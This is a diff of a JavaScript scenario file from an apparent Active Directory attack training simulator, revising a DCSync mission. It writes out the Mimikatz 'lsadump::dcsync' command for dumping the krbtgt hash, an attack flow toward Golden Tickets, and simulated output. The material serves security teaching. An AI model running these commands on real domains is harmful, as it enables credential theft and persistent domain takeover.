@@ -3,9 +3,11 @@
  *
  * This scenario simulates the DCSync attack, where an attacker uses
  * directory replication privileges to request password hashes directly
- * from a domain controller. With these hashes, attackers can craft
- * Golden Tickets or perform pass‑the‑hash attacks to move laterally
- * and persist in the environment.
+ * from a domain controller.
+ *
+ * THIS SCENARIO ASSUMES:
+ * 1. The user has gained an administrative shell on the Domain Controller
+ * (DC01) by completing the Pass-the-Hash (Mission 4) scenario.
  */
 
 export const dcsyncScenario = {
@@ -31,40 +33,33 @@ export const dcsyncScenario = {
 
   // Guide content for the sidebar
   guide: {
-    overview: `**DCSync** allows an attacker with directory replication privileges to request password hashes directly from Active Directory.\n\n` +
-      `**Attack Flow:**\n` +
-      `1. Identify accounts with replication privileges (often Domain Admins)\n` +
-      `2. Use Mimikatz to perform DCSync and replicate password hashes for key accounts (e.g. krbtgt)\n` +
-      `3. Use the stolen hash for further attacks or offline cracking\n\n` +
-      `**Why This Matters:**\n` +
-      `DCSync is a high‑impact technique because it allows attackers to extract NTLM hashes for any account, including the KRBTGT account used to sign Kerberos tickets. With these hashes, attackers can impersonate users or create Golden Tickets to maintain long‑term persistence.`,
+    overview: `**DCSync** allows an attacker with directory replication privileges (like a Domain Admin) to request password hashes directly from Active Directory.
+
+**Attack Flow:**
+1. Use your administrative shell on the DC to run Mimikatz.
+2. Use Mimikatz's 'lsadump::dcsync' module to request the 'krbtgt' account hash.
+3. Use the stolen hash to forge Golden Tickets for persistence.
+
+**Why This Matters:**
+DCSync is the final step to "owning" the domain. With the 'krbtgt' hash, you can forge Kerberos tickets for *any* user and maintain persistent access, even if all admin passwords are changed.`,
     steps: [
       {
         number: 1,
-        title: 'Identify Replication‑Privileged Accounts',
+        title: 'Perform DCSync with Mimikatz',
         description:
-          'List domain admin or replication‑privileged accounts that can perform DCSync. In practice, tools like BloodHound can identify these; here we use a simple net group enumeration.',
-        command: 'net group "Domain Admins" /domain',
-        tip:
-          'Domain Admins and accounts with the Replicating Directory Changes permissions can perform DCSync'
+          'You are already administrator on the DC from the previous mission. Now, run Mimikatz to request the password hash of the "krbtgt" account.',
+        command:
+          'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
+        tip: 'Replicating the KRBTGT hash is the key to creating Golden Tickets.'
       },
       {
         number: 2,
-        title: 'Perform DCSync with Mimikatz',
+        title: 'Review the Extracted Hash',
         description:
-          'Use Mimikatz to request the password hash of the KRBTGT account from the domain controller.',
-        command:
-          'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
-        tip: 'Replicating the KRBTGT hash allows forging Golden Tickets'
-      },
-      {
-        number: 3,
-        title: 'Review and Use the Extracted Hash',
-        description:
-          'The DCSync output contains the NTLM hash of the requested account. This can be used to create Golden Tickets or for Pass‑the‑Hash attacks.',
+          'The DCSync output contains the NTLM hash for the krbtgt account. This is the "master key" for the domain.',
         command: null,
         tip:
-          'Treat the extracted hash like a password: keep it secure and use it carefully in later steps'
+          'This hash is now in your "Files" tab. You can use it in the next mission to forge Golden Tickets.'
       }
     ]
   },
@@ -73,33 +68,14 @@ export const dcsyncScenario = {
   steps: [
     {
       id: 1,
-      expectedCommand: 'net group "Domain Admins" /domain',
-      attackerOutput: [
-        '[*] Enumerating members of Domain Admins...',
-        '[+] CONTOSO\\Administrator',
-        '[+] CONTOSO\\svc_backup',
-        '[+] CONTOSO\\sqlservice',
-        '[+] CONTOSO\\krbtgt',
-        '[+] Enumeration complete'
-      ],
-      serverOutput: [
-        '[SAMR] NetGroupGetUsers request from 10.0.0.5',
-        '[AUDIT] Domain group enumeration: Domain Admins'
-      ],
-      delay: 500
-    },
-    {
-      id: 2,
-      // Accept multiple valid ways of invoking DCSync, including different casing,
-      // optional .exe suffix, and optional $ on the user. The first command is
-      // treated as the canonical suggestion.
+      // Accept multiple valid ways of invoking DCSync
       expectedCommands: [
         'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
         'mimikatz "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
         'mimikatz.exe "lsadump::dcsync /domain:CONTOSO.LOCAL /user:krbtgt"',
         'mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt$"'
       ],
-      // Provide helpful messages for common mistakes so the simulator can guide the user
+      // Provide helpful messages for common mistakes
       commonMistakes: [
         {
           pattern: '^mimikatz(\\.exe)?\\s+lsadump::dcsync',
@@ -111,6 +87,7 @@ export const dcsyncScenario = {
         }
       ],
       attackerOutput: [
+        'C:\\Windows\\System32> mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"',
         '[*] Using DCSync to replicate KRBTGT account credentials...',
         '[*] Connecting to DC01.contoso.local...',
         '[+] Authenticated with replication privileges',
@@ -122,35 +99,36 @@ export const dcsyncScenario = {
         '[+] Hashes retrieved and stored'
       ],
       serverOutput: [
-        '[DS-REPL] DRSGetNCChanges request from 10.0.0.5',
+        '[DS-REPL] DRSGetNCChanges request from 10.0.1.10 (localhost)',
         '[DS-REPL] Object: krbtgt',
         '[AUDIT] Replication data request responded',
-        '[ALERT] Unusual replication request detected from 10.0.0.5'
+        '[ALERT] CRITICAL: A DCSync attack was performed from the Domain Controller itself!'
       ],
       delay: 700
     },
     {
-      id: 3,
+      id: 2,
       expectedCommand: null,
       attackerOutput: [
         '',
         '[+] ============================================',
         '[+] DCSync Attack Summary',
         '[+] ============================================',
-        '[+] Replication accounts enumerated: 4',
         '[+] Hashes extracted: 1 (krbtgt)',
-        '[+] Next Steps:',
+        '[+] DOMAIN COMPROMISED',
+        '[+] ============================================',
+        '[*] Next Steps:',
         '[*] 1. Use krbtgt NTLM hash to forge a Golden Ticket',
-        '[*] 2. Perform Pass‑the‑Hash to access critical systems',
-        '[*] 3. Consider cracking any extracted hashes offline',
+        '[*] 2. Gain persistent, undetectable access to all systems',
         '',
         '[+] Attack successful! 🎯'
       ],
       serverOutput: [
         '',
         '[ALERT] SECURITY INCIDENT DETECTED',
-        '[ALERT] Replication data accessed for account: krbtgt',
-        '[ALERT] Recommend auditing replication privileges and resetting KRBTGT twice'
+        '[ALERT] KRBTGT account hash has been compromised.',
+        '[ALERT] Recommend immediate (and double) KRBTGT password reset.',
+        '[ALERT] All domain Kerberos tickets are now untrusted.'
       ],
       delay: 400
     }
